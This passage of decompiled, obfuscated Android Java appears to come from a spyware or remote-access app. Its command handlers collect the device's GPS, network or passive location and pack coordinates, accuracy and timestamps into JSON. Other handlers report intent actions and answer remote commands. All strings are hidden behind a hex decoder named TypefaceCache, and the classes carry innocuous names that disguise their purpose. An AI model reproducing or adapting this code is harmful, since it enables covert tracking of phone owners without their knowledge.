                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(30000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 9;
                                if (ktukzhfmakoumu5.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                            case 3:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                ((roAK4OF9CtSmlCJgpQ) obj).getClass();
                                ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 4;
                                if (ktukzhfmakoumu2.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu3 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                String strObtain5 = TypefaceCache.obtain("002100790054009300CF");
                                action = ((Intent) this.pyu8ovAipBTLYAiKab).getAction();
                                if (action != null) {
                                    strPPWVWMPAUcr9AGNUSxQ = KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(action, action);
                                } else {
                                    strPPWVWMPAUcr9AGNUSxQ = "unknown";
                                }
                                str = strObtain5 + strPPWVWMPAUcr9AGNUSxQ;
                                this.ibVTtJUNfrGYbW = 5;
                                if (ktukzhfmakoumu3.Qrz92kRPw4GcghAc(context, str, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                int i11 = HandlerXNLoader.dDIMxZXP1V8HdM;
                                TypefaceCache.obtain("00070073004D008E00F300BA009200B5002600710052009400E400BA00C000A200270036005A008900F400FF00DA00A200220064004F008500F500BE00C600E7003000730055009300B000BE00D400B300260064001B008500FF00B000C6");
                                this.ibVTtJUNfrGYbW = 6;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(10000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 7;
                                if (ktukzhfmakoumu4.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                this.ibVTtJUNfrGYbW = 8;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(30000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 9;
                                if (ktukzhfmakoumu5.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                            case 4:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                ((roAK4OF9CtSmlCJgpQ) obj).getClass();
                                ktukzhfmakoumu3 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                String strObtain6 = TypefaceCache.obtain("002100790054009300CF");
                                action = ((Intent) this.pyu8ovAipBTLYAiKab).getAction();
                                if (action != null) {
                                    strPPWVWMPAUcr9AGNUSxQ = KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(action, action);
                                } else {
                                    strPPWVWMPAUcr9AGNUSxQ = "unknown";
                                }
                                str = strObtain6 + strPPWVWMPAUcr9AGNUSxQ;
                                this.ibVTtJUNfrGYbW = 5;
                                if (ktukzhfmakoumu3.Qrz92kRPw4GcghAc(context, str, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                int i12 = HandlerXNLoader.dDIMxZXP1V8HdM;
                                TypefaceCache.obtain("00070073004D008E00F300BA009200B5002600710052009400E400BA00C000A200270036005A008900F400FF00DA00A200220064004F008500F500BE00C600E7003000730055009300B000BE00D400B300260064001B008500FF00B000C6");
                                this.ibVTtJUNfrGYbW = 6;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(10000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 7;
                                if (ktukzhfmakoumu4.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                this.ibVTtJUNfrGYbW = 8;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(30000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 9;
                                if (ktukzhfmakoumu5.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                            case 5:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                ((roAK4OF9CtSmlCJgpQ) obj).getClass();
                                int i13 = HandlerXNLoader.dDIMxZXP1V8HdM;
                                TypefaceCache.obtain("00070073004D008E00F300BA009200B5002600710052009400E400BA00C000A200270036005A008900F400FF00DA00A200220064004F008500F500BE00C600E7003000730055009300B000BE00D400B300260064001B008500FF00B000C6");
                                this.ibVTtJUNfrGYbW = 6;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(10000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 7;
                                if (ktukzhfmakoumu4.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                this.ibVTtJUNfrGYbW = 8;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(30000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 9;
                                if (ktukzhfmakoumu5.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                            case 6:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 7;
                                if (ktukzhfmakoumu4.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                this.ibVTtJUNfrGYbW = 8;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(30000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 9;
                                if (ktukzhfmakoumu5.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                            case 7:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                ((roAK4OF9CtSmlCJgpQ) obj).getClass();
                                this.ibVTtJUNfrGYbW = 8;
                                if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(30000L, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 9;
                                if (ktukzhfmakoumu5.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                            case 8:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                this.ibVTtJUNfrGYbW = 9;
                                if (ktukzhfmakoumu5.tne6mXOUFKdd(context, this) == pjn1l01kdmwnpcy0dad3) {
                                    return pjn1l01kdmwnpcy0dad3;
                                }
                                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                            case 9:
                                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                ((roAK4OF9CtSmlCJgpQ) obj).getClass();
                                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                            default:
                                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                        }
                    } catch (Exception e2) {
                        int i14 = HandlerXNLoader.dDIMxZXP1V8HdM;
                        TypefaceCache.obtain("00050055007600C700E400B000D900A2002D0036005D008600F900B300D700A300790036");
                        e2.getMessage();
                    }
                } catch (Exception e3) {
                    int i15 = HandlerXNLoader.dDIMxZXP1V8HdM;
                    TypefaceCache.obtain("000100790054009300B000AD00D700A0002A0065004F009500F100AB00DB00A8002D0036005D008600F900B300D700A300790036");
                    e3.getMessage();
                } finally {
                    pendingResult.finish();
                }
                break;
            case 4:
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad4 = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                int i16 = this.ibVTtJUNfrGYbW;
                if (i16 != 0) {
                    if (i16 == 1) {
                        SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                    } else {
                        if (i16 != 2) {
                            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                        }
                        SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                    }
                    return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                }
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                EGkFhLGNSY179 eGkFhLGNSY179 = EGkFhLGNSY179.dDIMxZXP1V8HdM;
                JSONArray jSONArray = (JSONArray) this.b1EoSIRjJHO5;
                this.ibVTtJUNfrGYbW = 1;
                obj = eGkFhLGNSY179.JXn4Qf7zpnLjP5(jSONArray, this);
                if (obj == pjn1l01kdmwnpcy0dad4) {
                    return pjn1l01kdmwnpcy0dad4;
                }
                JSONObject jSONObject2 = (JSONObject) obj;
                SyncQYAdapter syncQYAdapter = (SyncQYAdapter) this.pyu8ovAipBTLYAiKab;
                String str4 = (String) this.D5P1xCAyuvgF;
                String strObtain7 = TypefaceCache.obtain(jSONObject2.optBoolean(TypefaceCache.obtain("003000630058008400F500AC00C1")) ? "0026006E005E008400E500AB00D700A3" : "002500770052008B00F500BB");
                this.ibVTtJUNfrGYbW = 2;
                String str5 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                if (syncQYAdapter.SZMVQHSLEmk3KzoEzyls(str4, strObtain7, jSONObject2, this) == pjn1l01kdmwnpcy0dad4) {
                    return pjn1l01kdmwnpcy0dad4;
                }
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
            case 5:
                SyncQYAdapter syncQYAdapter2 = (SyncQYAdapter) this.D5P1xCAyuvgF;
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad5 = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                int i17 = this.ibVTtJUNfrGYbW;
                try {
                    if (i17 == 0) {
                        SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                        LocationManager locationManager = (LocationManager) syncQYAdapter2.getSystemService("location");
                        if (syncQYAdapter2.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != 0) {
                            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("000D0079001B008B00FF00BC00D300B3002A0079005500C700E000BA00C000AA002A00650048008E00FF00B1"));
                        }
                        aqjfzuf02xh6w = new aqjfZUF02xH6w();
                        Location lastKnownLocation = locationManager.getLastKnownLocation("gps");
                        if (lastKnownLocation == null && (lastKnownLocation = locationManager.getLastKnownLocation("network")) == null) {
                            lastKnownLocation = locationManager.getLastKnownLocation("passive");
                        }
                        aqjfzuf02xh6w.w9sT1Swbhx3hs = lastKnownLocation;
                        if (lastKnownLocation == null) {
                            this.b1EoSIRjJHO5 = aqjfzuf02xh6w;
                            this.pyu8ovAipBTLYAiKab = aqjfzuf02xh6w;
                            this.ibVTtJUNfrGYbW = 1;
                            obj = SyncQYAdapter.JXn4Qf7zpnLjP5(syncQYAdapter2, locationManager, this);
                            if (obj == pjn1l01kdmwnpcy0dad5) {
                                return pjn1l01kdmwnpcy0dad5;
                            }
                            aqjfzuf02xh6w2 = aqjfzuf02xh6w;
                            aqjfzuf02xh6w3 = aqjfzuf02xh6w2;
                        }
                        if (aqjfzuf02xh6w.w9sT1Swbhx3hs != null) {
                            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("000F00790058008600E400B600DD00A9006300780054009300B000BE00C400A6002A007A005A008500FC00BA"));
                        }
                        JSONObject jSONObject3 = new JSONObject();
                        jSONObject3.put(TypefaceCache.obtain("002F0077004F008E00E400AA00D600A2"), ((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getLatitude());
                        jSONObject3.put(TypefaceCache.obtain("002F00790055008000F900AB00C700A30026"), ((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getLongitude());
                        jSONObject3.put(TypefaceCache.obtain("002200750058009200E200BE00D100BE"), new Float(((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getAccuracy()));
                        String strObtain8 = TypefaceCache.obtain("003300640054009100F900BB00D700B5");
                        provider = ((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getProvider();
                        if (provider == null) {
                            provider = TypefaceCache.obtain("003600780050008900FF00A800DC");
                        }
                        jSONObject3.put(strObtain8, provider);
                        jSONObject3.put(TypefaceCache.obtain("0037007F00560082"), ((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getTime());
                        return jSONObject3;
                    }
                    if (i17 != 1) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    aqjfzuf02xh6w2 = (aqjfZUF02xH6w) this.pyu8ovAipBTLYAiKab;
                    aqjfzuf02xh6w3 = (aqjfZUF02xH6w) this.b1EoSIRjJHO5;
                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                    aqjfzuf02xh6w2.w9sT1Swbhx3hs = obj;
                    aqjfzuf02xh6w = aqjfzuf02xh6w3;
                    if (aqjfzuf02xh6w.w9sT1Swbhx3hs != null) {
                        return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("000F00790058008600E400B600DD00A9006300780054009300B000BE00C400A6002A007A005A008500FC00BA"));
                    }
                    JSONObject jSONObject4 = new JSONObject();
                    jSONObject4.put(TypefaceCache.obtain("002F0077004F008E00E400AA00D600A2"), ((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getLatitude());
                    jSONObject4.put(TypefaceCache.obtain("002F00790055008000F900AB00C700A30026"), ((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getLongitude());
                    jSONObject4.put(TypefaceCache.obtain("002200750058009200E200BE00D100BE"), new Float(((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getAccuracy()));
                    String strObtain9 = TypefaceCache.obtain("003300640054009100F900BB00D700B5");
                    provider = ((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getProvider();
                    if (provider == null) {
                        provider = TypefaceCache.obtain("003600780050008900FF00A800DC");
                    }
                    jSONObject4.put(strObtain9, provider);
                    jSONObject4.put(TypefaceCache.obtain("0037007F00560082"), ((Location) aqjfzuf02xh6w.w9sT1Swbhx3hs).getTime());
                    return jSONObject4;
                } catch (Exception e4) {
                    String str6 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                    TypefaceCache.obtain("00040073004F00C700FC00B000D100A60037007F0054008900B000BA00C000B5002C0064000100C7");
                    e4.getMessage();
                    JSONObject jSONObject5 = new JSONObject();
                    String strObtain10 = TypefaceCache.obtain("002600640049008800E2");
                    String message = e4.getMessage();
                    if (message == null) {
                        message = TypefaceCache.obtain("001600780050008900FF00A800DC00E7002600640049008800E2");
                    }
                    return jSONObject5.put(strObtain10, message);
                }
            default:
                sFdNPiaH9eT4T sfdnpiah9et4t = (sFdNPiaH9eT4T) this.pyu8ovAipBTLYAiKab;
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad6 = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                int i18 = this.ibVTtJUNfrGYbW;
                if (i18 == 0) {
                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                    List list = (List) ((r5XEUfod5GSCCwq6c) this.b1EoSIRjJHO5).vekpFI4d1Nc4fakF;
                    ArrayList arrayList2 = new ArrayList();
                    for (Object obj2 : list) {
                        if (((pf6EfGexAWq4v) obj2).w9sT1Swbhx3hs(sfdnpiah9et4t)) {
                            arrayList2.add(obj2);
                        }
                    }
                    ArrayList arrayList3 = new ArrayList(D8f4u3NB1PCAS427.xfn2GJwmGqs7kWW(arrayList2));
                    int size = arrayList2.size();
                    int i19 = 0;
                    while (i19 < size) {
                        Object obj3 = arrayList2.get(i19);
                        i19++;
                        pf6EfGexAWq4v pf6efgexawq4v = (pf6EfGexAWq4v) obj3;
                        pf6efgexawq4v.getClass();
                        arrayList3.add(new GRovd1ShkBeHDeJnPBM(i, new JnC75xOgwtSSKHn30v(pf6efgexawq4v, objArr2 == true ? 1 : 0, i2)));
                    }
                    vaKjTlFcAV7l5E6Q vakjtlfcav7l5e6q = new vaKjTlFcAV7l5E6Q(new GRovd1ShkBeHDeJnPBM(i2, (xuyi7QZPbnP6xOQ3Cu[]) imhBI9RqzETHtVIJe.dQC4QhgRN3MSEAP3HW0(arrayList3).toArray(new xuyi7QZPbnP6xOQ3Cu[0])));
                    TyQPbs0LIuCukUqcQm tyQPbs0LIuCukUqcQm = new TyQPbs0LIuCukUqcQm((d7yjIEB02ZavJfb7Dt) this.D5P1xCAyuvgF, sfdnpiah9et4t);
                    this.ibVTtJUNfrGYbW = 1;
                    if (vakjtlfcav7l5e6q.dDIMxZXP1V8HdM(tyQPbs0LIuCukUqcQm, this) == pjn1l01kdmwnpcy0dad6) {
                        return pjn1l01kdmwnpcy0dad6;
                    }
                } else {
                    if (i18 != 1) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                }
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        }
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ eoUwMTDTg3dRNUqWJq3(Object obj, Object obj2, Object obj3, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q, int i) {
        super(2, b9xroaxfr1fmoo2q);
        this.xDyLpEZyrcKVe0 = i;
        this.b1EoSIRjJHO5 = obj;
        this.pyu8ovAipBTLYAiKab = obj2;
        this.D5P1xCAyuvgF = obj3;
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ eoUwMTDTg3dRNUqWJq3(Object obj, Object obj2, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q, int i) {
        super(2, b9xroaxfr1fmoo2q);
        this.xDyLpEZyrcKVe0 = i;
        this.pyu8ovAipBTLYAiKab = obj;
        this.D5P1xCAyuvgF = obj2;
    }
}
